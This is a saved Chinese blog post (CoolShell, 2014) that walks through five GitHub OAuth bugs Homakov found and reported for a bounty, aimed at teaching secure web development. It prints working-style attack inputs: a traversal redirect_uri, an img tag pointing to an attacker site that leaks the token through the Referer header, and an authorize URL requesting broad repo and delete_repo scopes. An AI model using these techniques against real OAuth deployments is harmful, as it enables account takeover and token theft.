@@ -1,0 +1,235 @@
+<!DOCTYPE html><!--[if IE 8]>
+<html id="ie8" dir="ltr" lang="zh-CN"
+	prefix="og: https://ogp.me/ns#" >
+<![endif]--><!--[if !(IE 8) ]><!--><html dir="ltr" lang="zh-CN" prefix="og: https://ogp.me/ns#"><!--<![endif]--><head><meta charset="UTF-8"/><title>从“黑掉Github”学Web安全开发 | 酷 壳 - CoolShell</title><link rel="stylesheet" type="text/css" href="/assets/all.min.css"/><link rel="shortcut icon" href="/assets/favicon.png"/></head>
+<body class="post-template-default single single-post postid-11021 single-format-standard group-blog">
+
+<div id="page" class="hfeed site">
+
+<div class="container">
+<div class="row">
+
+</div>
+</div>
+<div id="content" class="site-content">
+<div class="container">
+<div class="row">
+<div id="primary" class="content-area  col-md-12" style="margin-top: 40px;">
+<main id="main" role="main">
+<article id="post-11021" class="post-content post-11021 post type-post status-publish format-standard hentry category-webdev category-netsecurity tag-gist tag-github tag-oauth tag-web tag-318">
+<header class="entry-header">
+<span class="screen-reader-text">从“黑掉Github”学Web安全开发</span>
+<h1 class="entry-title">从“黑掉Github”学Web安全开发</h1>
+<div class="entry-meta">
+<h5 class="entry-date"><i class="fa fa-calendar-o"></i> <a href="/articles/11021.html" title="08:16" rel="bookmark"><time class="entry-date" datetime="2014-02-10T08:16:11+08:00" pubdate="">2014年02月10日 </time></a><span class="byline"><span class="sep"></span><i class="fa fa-user"></i>
+<span class="author vcard"><a class="url fn n" href="/articles/author/haoel" title="View all posts by 陈皓" rel="author">陈皓</a></span></span> <i class="fa fa-comments-o"></i><span class="screen-reader-text">评论 </span> <a href="/articles/11021.html#comments" class="comments-link">61 条评论</a> <i class="fa fa-users" style="margin-left:10px;"></i> 101,052 人阅读</h5>
+</div>
+</header>
+<div class="entry-content">
+<p><img decoding="async" class="alignright" alt="" src="/uploads/2014/02/Github-Security.png" width="236" height="251" srcset=""/>Egor Homakov（Twitter: <a href="https://twitter.com/homakov">@homakov</a> 个人网站: <a href="http://egorhomakov.com/">EgorHomakov.com</a>）是一个Web安全的布道士，他这两天把github给黑了，并给github报了5个安全方面的bug，他在他的这篇blog——《<a href="https://homakov.blogspot.com/2014/02/how-i-hacked-github-again.html" target="_blank">How I hacked Github again</a>》（墙）说明了这5个安全bug以及他把github黑掉的思路。Egor的这篇文章讲得比较简单，很多地方一笔带过，所以，<strong>我在这里用我的语言给大家阐述一下黑掉Github的思路以及原文中所提到的那5个bug。希望这篇文章能让从事Web开发的同学们警惕</strong>。关于Web开发中的安全事项，大家可以看看这篇文章《<a title="Web开发中需要了解的东西" href="/articles/6043.html" target="_blank">Web开发中的你需要了解的东西</a>》</p>
+<div id="ez-toc-container" class="ez-toc-v2_0_48 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction">
+<div class="ez-toc-title-container">
+<p class="ez-toc-title">目录</p>
+<span class="ez-toc-title-toggle"></span></div>
+<nav><ul class="ez-toc-list ez-toc-list-level-1 "><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#OAuth%E7%AE%80%E4%BB%8B" title="OAuth简介">OAuth简介</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#OAuth%E7%9A%84Callback" title="OAuth的Callback">OAuth的Callback</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%AC%AC%E4%B8%80%E4%B8%AABug_%E2%80%94_%E6%B2%A1%E6%9C%89%E6%A3%80%E6%9F%A5%E9%87%8D%E5%AE%9A%E5%90%91URL%E4%B8%AD%E7%9A%84" title="第一个Bug — 没有检查重定向URL中的/../">第一个Bug — 没有检查重定向URL中的/../</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AABUG_%E2%80%94_%E6%B2%A1%E6%9C%89%E6%A0%A1%E9%AA%8Ctoken" title="第二个BUG — 没有校验token">第二个BUG — 没有校验token</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%AC%AC%E4%B8%89%E4%B8%AABUG_%E2%80%94_%E6%B3%A8%E5%85%A5%E8%B7%A8%E7%AB%99%E5%9B%BE%E7%89%87" title="第三个BUG — 注入跨站图片">第三个BUG — 注入跨站图片</a><ul class="ez-toc-list-level-5"><li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%83%8F%E7%A8%8B%E5%BA%8F%E5%91%98%E4%B8%80%E6%A0%B7%E7%9A%84%E6%80%9D%E8%80%83" title="像程序员一样的思考">像程序员一样的思考</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E7%AC%AC%E5%9B%9B%E4%B8%AAbug_%E2%80%93_Gist%E6%8A%8Agithub_token%E6%94%BE%E5%9C%A8%E4%BA%86cookie%E9%87%8C" title="第四个bug – Gist把github_token放在了cookie里">第四个bug – Gist把github_token放在了cookie里</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E7%AC%AC%E4%BA%94%E4%B8%AABug_%E2%80%93_%E8%87%AA%E5%8A%A8%E7%BB%99gist%E6%8E%88%E6%9D%83" title="第五个Bug – 自动给gist授权">第五个Bug – 自动给gist授权</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#_%E5%85%B6%E5%AE%83_%E6%84%9F%E6%83%B3" title=" 其它 &amp; 感想"> 其它 &amp; 感想</a></li></ul></nav></div>
+<h4><span class="ez-toc-section" id="OAuth%E7%AE%80%E4%BB%8B"></span>OAuth简介<span class="ez-toc-section-end"></span></h4>
+<p>首先，这个故事要从<a href="https://developer.github.com/v3/oauth/" target="_blank">Github OAuth</a>讲起。所以，我们需要先知道什么是<a href="https://en.wikipedia.org/wiki/OAuth" target="_blank">OAuth</a>。所谓OAuth就是说，第三方的应用可以通过你的授权而不用知道你的帐号密码能够访问你在某网站的你自己的数据或功能。像Google, Facebook, Twitter等网站都提供了OAuth服务，提供OAuth服务的网站一般都有很多开放的API，第三方应用会调用这些API来开发他们的应用以让用户拥有更多的功能，但是，当用户在使用这些第三方应用的时候，这些第三方的应用会来访问用户的帐户内的功能和数据，所以，当第三应用要干这些事的时候，我们不能让第三方应用弹出一个对话框来问用户要他的帐号密码，不然第三方的应用就把用户的密码给获取了，所以，OAuth协议会跳转到一个页面，让用户授权给这个第三方应用以某些权限，然后，这个权限授权的记录保存在Google/Facebook/Twitter上，并向第三方应用返回一个授权token，于是第三方的应用通过这个token来操作某用户帐号的功能和数据时，就畅通无阻了。下图简单地说明了Twitter的OAuth的授权过程。</p>
+<p><span id="more-11021"></span></p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="aligncenter  wp-image-11022" alt="" src="/uploads/2014/02/oauth-authentication.png" width="630" height="375" srcset="" sizes="(max-width: 630px) 100vw, 630px"/></p>
+<p style="text-align: left;">从上面的流程图中，我们可以看OAuth不管是1.0还是2.0版本都是一个比较复杂的协议，所以，在Server端要把OAuth实现对并不是一些容易事，其总是或多或少会有些小错误。Egor就找到了几个Github的OAuth的实现的问题。</p>
+<h4 style="text-align: left;"><span class="ez-toc-section" id="OAuth%E7%9A%84Callback"></span>OAuth的Callback<span class="ez-toc-section-end"></span></h4>
+<p>还需要注意的是，因为OAuth是需要跳到主站的网页上去让用户授权，当用户授权完后，需要跳转回原网页，所以，一般来说，OAuth授权页都会带一个 redirect_url的参数，用于指定跳转回原来的网页。Github使用的这个跳转参数是redirect_uri参数。一般来说，redirect_uri这个参数需要在服务器端进行验证。</p>
+<p>你想一下，如果有人可以控制这个redirect_uri这个参数，那么，你就可以让其跳转到别的网页上（可能会是个有恶意的网页）。如果你觉得跳转到别的网页上也无所谓，那么你就错了。别忘了，当你对这个第三方的应用授权通过后，服务方会给第三方应用返回一个授权token，这个token会被加到那个redirect_uri参数后面然后跳转回去，如果这个redirect_uri被别有用心的人改一个恶意的网址后，这个token也就被转过去了，于是授权token也就被泄漏过去了。</p>
+<p>知道了这一切，我们就可以理解Egor提的那5个bug是什么意思了。</p>
+<h4><span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E4%B8%AABug_%E2%80%94_%E6%B2%A1%E6%9C%89%E6%A3%80%E6%9F%A5%E9%87%8D%E5%AE%9A%E5%90%91URL%E4%B8%AD%E7%9A%84"></span>第一个Bug — 没有检查重定向URL中的/../<span class="ez-toc-section-end"></span></h4>
+<p>首先，我们通过<a href="https://developer.github.com/v3/oauth/#redirect-urls" target="_blank">Github的 redirect_uri 的说明文档</a>我们可以看到这样的说明：</p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">如果 CALLBACK URL是: http://example.com/path
+
+GOOD: https://example.com/path
+GOOD: http://example.com/path/subdir/other
+
+BAD: http://example.com/bar
+BAD: http://example.com/
+BAD: http://example.com:8080/path
+BAD: http://oauth.example.com:8080/path
+BAD: http://example.org</pre>
+<p>而Github对于redirect_uri做了限制，要求只能跳回到 https://gist.github.com/auth/github/callback/，也就是说，域名是gist.github.com，目录是/auth/github/callback/，服务器端做了这个限制，看似很安全了。</p>
+<p>但是，Egor发现，Github的服务器端并没有验证.. /../../这样的情况。</p>
+<p>于是，Egor相当于构造了一个下面这样的Redirect URL：</p>
+<pre style="font-size: 10pt;">https://gist.github.com/auth/github/callback/../../../homakov/8820324?code=CODE</pre>
+<p>于是上面的URL就相当于：</p>
+<pre style="font-size: 10pt;">https://gist.github.com/homakov/8820324?code=CODE</pre>
+<p>你可以看到，认证后的跳转网页转到了别的地方去（并非是github限制的地方）——我们知道Github的gist虽然是给你分享代码片段的，但是也可以用来定制自己的东西的（比如markdown），这个gist的网页当然是被Egor所控制的。</p>
+<h4><span class="ez-toc-section" id="%E7%AC%AC%E4%BA%8C%E4%B8%AABUG_%E2%80%94_%E6%B2%A1%E6%9C%89%E6%A0%A1%E9%AA%8Ctoken"></span>第二个BUG — 没有校验token<span class="ez-toc-section-end"></span></h4>
+<p>第一个bug其实并没有什么，如果服务器端要校验一下token是否和之前生成的token的redirect_uri一模一样，只要服务器做了这个验证，第一个bug完全没有什么用处，但是，github的服务端并没有验证。</p>
+<p>这就是第二个bug，于是第一个和第二个bug组合起来成了一个相当有威力的安全漏洞。</p>
+<p>也就是说，token的生成要考虑redirect_uri，这样，当URL跳转的时候，会把redirect_uri和token带到跳转页面（这里的跳转页面还是github自己的），跳转页面的服务端程序要用redirect_uri来生成一个token，看看是不是和传来的token是一个样的。这就是所谓的对URL进行签名——以保证URL的不被人篡改。一般来说，对URL签名和对签名验证的因子包括，源IP，服务器时间截，session，或是再加个salt什么的。</p>
+<h4><span class="ez-toc-section" id="%E7%AC%AC%E4%B8%89%E4%B8%AABUG_%E2%80%94_%E6%B3%A8%E5%85%A5%E8%B7%A8%E7%AB%99%E5%9B%BE%E7%89%87"></span>第三个BUG — 注入跨站图片<span class="ez-toc-section-end"></span></h4>
+<p>现在，redirect_uri带着code，安全顺利地跳到了Egor构造的网页上：</p>
+<pre>https://gist.github.com/homakov/8820324?code=CODE</pre>
+<p>但是，这个是gist的网页，你无法在这个页面上运行前端（Javascript）或后端程序（Ruby——Github是Ruby做的），现在的问题是我们怎么得到那个code，因为那个code虽然后带到了我的网页上来，但那个网页还是github和用户自己的环境。</p>
+<p>到这里，一般来说，黑客会在这个页面上放一个诸如下面的一个链接，来引诱用户点击，：</p>
+<p>&lt;a href=http://hack.you.com/&gt;私人照片&lt;/a&gt;</p>
+<p>这样，当页面跳转到黑客的网站上来后，你之前的网页上的网址会被加在http头里的 Refere 参数里，这样，我就可以得到你的token了。</p>
+<p>但是，在gist上放个链接还要用户去点一下，这个太影响“用户体验”了，最好能嵌入点外部的东西。gist上可以嵌入外站的图片，但是github的开发人员并非等闲之辈，对于外站的图片，其统统会把这些图片的url代理成github自己的url，所以，你很难搞定。</p>
+<p>不过，我们可以用一个很诡异的技巧：</p>
+<p style="text-align: center;"><b>&lt;img src=”///attackersite.com”&gt;</b></p>
+<p>这个是什么玩意？这个是个URL的相对路径。但是为什么会有三个///呢？呵呵。</p>
+<h5><span class="ez-toc-section" id="%E5%83%8F%E7%A8%8B%E5%BA%8F%E5%91%98%E4%B8%80%E6%A0%B7%E7%9A%84%E6%80%9D%E8%80%83"></span>像程序员一样的思考<span class="ez-toc-section-end"></span></h5>
+<p>这个时候，我们需要以“程序员的编程思维”来思考问题——如果你是程序员，你会怎么写校验URL的程序？你一定会想到使用正则表达式，或是用程序来匹配URL中的一些pattern。于是，</p>
+<ul>
+<li>对于绝对路径：你会匹配两个//，后面的可能会是 <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a7d2d4c2d5e7cfc8d4d389c4c8ca">[email protected]</a>（user@是可选的），然后可能会有:&lt;n&gt;端口号，然后是/，后面是服务器的路径，再往后面应该是?后面带一些参数了。</li>
+</ul>
+<ul>
+<li>对于相对路径：就没有绝对路径那么复杂了。就是些 .. 和 /再加上?和一些参数。</li>
+</ul>
+<p>好了，如果coolshell.cn网页中的&lt;img src=&gt;或&lt;a href=&gt;中用到的相对路径是 /host.com，那么浏览器会解释成：https://coolshell.cn/host.com，如果是///host.com，那么就应该被浏览器解释成 https://coolshell.cn///host.com。</p>
+<p>但是，Chrome和Firefox，会把///host.com当成绝对路径，因为其正确匹配了绝对路径的scheme。如果你正在用Chrome/Firefox看这篇文章 ，你可以看看下面的连接（源码如下）：</p>
+<p style="text-align: center;"><a href="///www.google.com" target="_blank">CoolShell Test</a></p>
+<p><code data-enlighter-language="html" class="EnlighterJSRAW">&lt;a href=&#34;///www.google.com&#34;&gt;CoolShell Test&lt;/a&gt;</code></p>
+<p>关键是，这个Chrome/Firefox的问题被标记成了Won’t Fix，我勒个去，基本上来说，后台的程序也有可能有这样的问题，对于Perl，Python，Ruby，Node.js，PHP带的URL检查的函数库都有这样的问题。</p>
+<p>于是，我们就可以使用这样的方式给gist注入了一个第三方站点的图片（github的服务端没有察觉到（因为我们前面说过大多数语言的URL检查库都会被 Bypass了），但是浏览器端把这个链接解释到了第三方的站点上），于是请求这个图片的http头中的refere 中包含用户当前页面的URL，也包含了用户授权的code。</p>
+<p>到这里，黑客Egor已经拿到用户gist的权限并可以修改或查看用户私用的gist了。但是作者并没有满足，他想要的更多。</p>
+<h4><span class="ez-toc-section" id="%E7%AC%AC%E5%9B%9B%E4%B8%AAbug_%E2%80%93_Gist%E6%8A%8Agithub_token%E6%94%BE%E5%9C%A8%E4%BA%86cookie%E9%87%8C"></span>第四个bug – Gist把github_token放在了cookie里<span class="ez-toc-section-end"></span></h4>
+<p>于是Egor在用户的cookie里找到了 github_token</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-11030" alt="" src="/uploads/2014/02/gist_cookie.png" width="395" height="47" srcset="" sizes="(max-width: 395px) 100vw, 395px"/></p>
+<p>但是这个token没什么用，因为授权的Scope只有gists。但是，这个token不应该放在用户端的cookie里，本身就是一个安全事故，这个东西只能放在服务端（关于Web开发中的安全事项，可以看看这篇文章《<a title="Web开发中需要了解的东西" href="/articles/6043.html" target="_blank">Web开发中的你需要了解的东西</a>》）。</p>
+<p>于是，Egor只能另谋出路。</p>
+<h4><span class="ez-toc-section" id="%E7%AC%AC%E4%BA%94%E4%B8%AABug_%E2%80%93_%E8%87%AA%E5%8A%A8%E7%BB%99gist%E6%8E%88%E6%9D%83"></span>第五个Bug – 自动给gist授权<span class="ez-toc-section-end"></span></h4>
+<p>因为gist是github自家的，Egor所以估计github想做得简单一点，当用户访问gist的时候，不会出弹出一个OAuth的页面来让用户授权，不然，用户就会很诧异，都是你们自家的东西，还要授权？所以，Egor猜测github应该是对gist做了自动授权，于是，Egor搞了这样的一个URL（注意其中的 redirect_uri中的scope ）</p>
+<p style="word-wrap: break-word; padding: 10px 20px 20px 30px; background-color: #eee;">https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&amp;redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%<b>2Fcallback/../../../homakov/8820324</b>&amp;response_type=code&amp;<b>scope=repo,gists,user,delete_repo,notifications</b></p>
+<p>于是，这个redirect-uri不但帮黑客拿到了访问gist的token，而且还把授权token的scope扩大到了用户的代码库等其它权限。于是你就可以黑入用户的私有代码区了。</p>
+<h4><span class="ez-toc-section" id="_%E5%85%B6%E5%AE%83_%E6%84%9F%E6%83%B3"></span> 其它 &amp; 感想<span class="ez-toc-section-end"></span></h4>
+<p>于是，作者从 <a href="https://bounty.github.com/">Github Security Bug Bounty</a> 拿到了USD $4,000的奖励！Egor一共花了从下午2点到6点一共4个小时找到了这些Bug，平均一小时1000美刀。Egor还很得瑟的说，如果Github请他做安全顾问，他只收一小时USD $400刀，这4个小时也就$1,600。呵呵。大家看看，这是多么有效率的赚钱方式。</p>
+<p>下图是Github上的赏金猎手的排行榜（<a href="https://bounty.github.com/index.html#leaderboard" target="_blank">https://bounty.github.com/index.html#leaderboard</a>）你可以上去挨个看看他们找到的问题，你会发现好些安全问题都很小，有些只能说是不是很规范的问题，Github都赏了几百刀。我查看了一下github的赏金政策，github赏金至少100刀，到5000刀不等。</p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="aligncenter  wp-image-11053" alt="" src="/uploads/2014/02/github_bounty_leaderboard.jpg" width="580" height="478" srcset="" sizes="(max-width: 580px) 100vw, 580px"/></p>
+<p>让我们扪心自问一下，我们花了多少时间在玩那些“红包游戏”，而又搞到了多少红包？人家4个小时找了5个bug，挣了$4000美金。<strong>老天给了你我一样的时间，我们用来抽几块钱的红包，人家用自己的技能来挣奖金。这就是人和人的差距。这就是所谓的效率</strong>——你可以移步看看我写的《<a title="加班与效率" href="/articles/10217.html" target="_blank">加班与效率</a>》</p>
+<p>（全文完）</p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div id="post-ratings-11021-loading" class="post-ratings-loading"><img src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/loading.gif" width="16" height="16" class="post-ratings-image"/>Loading...</div>
+</div>
+<footer class="entry-footer">
+<hr/><div class="row"><div class="col-md-6 cattegories"><span class="cat-links"><i class="fa fa-folder-open"></i>
+<a href="javascript:void(0)" rel="category tag">Web开发</a>, <a href="javascript:void(0)" rel="category tag">网络安全</a></span></div><div class="col-md-6 tags"><span class="tags-links"><i class="fa fa-tags"></i> <a href="javascript:void(0)" rel="tag">Gist</a>, <a href="javascript:void(0)" rel="tag">github</a>, <a href="javascript:void(0)" rel="tag">OAuth</a>, <a href="javascript:void(0)" rel="tag">Web</a>, <a href="javascript:void(0)" rel="tag">安全</a></span></div></div> </footer>
+</article>
+
+<div class="fixed"></div> 
+</main>
+
+<div class="post-comments">
+<div id="comments" class="comments-area">
+<h2 class="comments-title">
+《<span>从“黑掉Github”学Web安全开发</span>》的相关评论 </h2>
+<ol class="comment-list">
+<li id="comment-1822749" class="comment even thread-even depth-1">
+<article id="div-comment-1822749" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/9d5e59f6b1dada9bc052e837a0f1b5c0?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/9d5e59f6b1dada9bc052e837a0f1b5c0?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://yavix.ru/" class="url" rel="ugc external nofollow">(&gt;褋邪泄褌[&gt;http:鈺扁暠zh.wikipedia.org鈺眞iki鈺卞惔浣崇強</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/11021.html/comment-page-2#comment-1822749"><time datetime="2016-04-29T21:25:04+08:00">2016年04月29日 21:25</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>像憎恨瘟疫一样憎恨贫</p>
+</div>
+ </article>
+</li>
+<li id="comment-1863458" class="pingback odd alt thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.cdxy.me/penetration-test/oauth/" class="url" rel="ugc external nofollow">OAuth 2.0攻击方法及案例总结 – 乐枕的家</a> </div>
+</li>
+<li id="comment-1863459" class="pingback even thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.cdxy.me/uncategorized/oauth/" class="url" rel="ugc external nofollow">OAuth 2.0攻击方法与案例总结 – 乐枕的家</a> </div>
+</li>
+<li id="comment-1863651" class="pingback odd alt thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.mottoin.com/85760.html" class="url" rel="ugc external nofollow">OAuth 2.0攻击面及案例-MottoIN</a> </div>
+</li>
+<li id="comment-1864516" class="pingback even thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.evil0x.com/posts/28794.html" class="url" rel="ugc external nofollow">OAuth 2.0攻击面与案例总结 | 邪恶十六进制</a> </div>
+</li>
+<li id="comment-1864559" class="pingback odd alt thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.swkami.com/archives/175" class="url" rel="ugc external nofollow">OAuth 2.0攻击面与案例总结黑客QQ52984643 |</a> </div>
+</li>
+<li id="comment-1910288" class="pingback even thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.xdhcn.com/?p=1161" class="url" rel="ugc external nofollow">从 MongoDB “赎金事件” 看安全问题 | 星达红</a> </div>
+</li>
+<li id="comment-1921005" class="pingback odd alt thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="https://www.omgwd.com/2017/09/%e5%85%b3%e4%ba%8efacebook-%e7%9a%84-react-%e4%b8%93%e5%88%a9%e8%ae%b8%e5%8f%af%e8%af%81/" class="url" rel="ugc external nofollow">关于Facebook 的 React 专利许可证 - 知乎精选</a> </div>
+</li>
+<li id="comment-1996374" class="pingback even thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.bigbai.net/2019/05/09/%e3%80%90%e9%85%b7%e5%a3%b3%e3%80%91-http-api-%e8%ae%a4%e8%af%81%e6%8e%88%e6%9d%83%e6%9c%af/" class="url" rel="ugc external nofollow">【酷壳】 HTTP API 认证授权术 | 大白的平凡世界</a> </div>
+</li>
+<li id="comment-2274207" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-2274207" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/702901a9e73c14aea043703bfa5d7827?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/702901a9e73c14aea043703bfa5d7827?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">网赚</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/11021.html/comment-page-2#comment-2274207"><time datetime="2021-07-07T18:08:41+08:00">2021年07月07日 18:08</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>网赚项目：www.nizhuanqian.com</p>
+</div>
+ </article>
+</li>
+</ol>
+<nav class="navigation comment-navigation" role="navigation">
+<h2 class="screen-reader-text">Comment navigation</h2>
+<div class="nav-links">
+<div id="commentnavi">
+<span class="pages"><i class="fa fa-comments"></i> 评论分页</span>
+<div id="commentpager">
+<a class="prev page-numbers" href="/articles/11021.html/comment-page-1#comments">« 上一页</a>
+<a class="page-numbers" href="/articles/11021.html/comment-page-1#comments">1</a>
+<span aria-current="page" class="page-numbers current">2</span> <span id="cp_post_id">11021</span>
+</div>
+<div class="fixed"></div>
+</div>
+</div>
+</nav>
+
+</div>
+</div>
+</div>
+
+</div> 
+</div>
+
+</div>
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body></html>
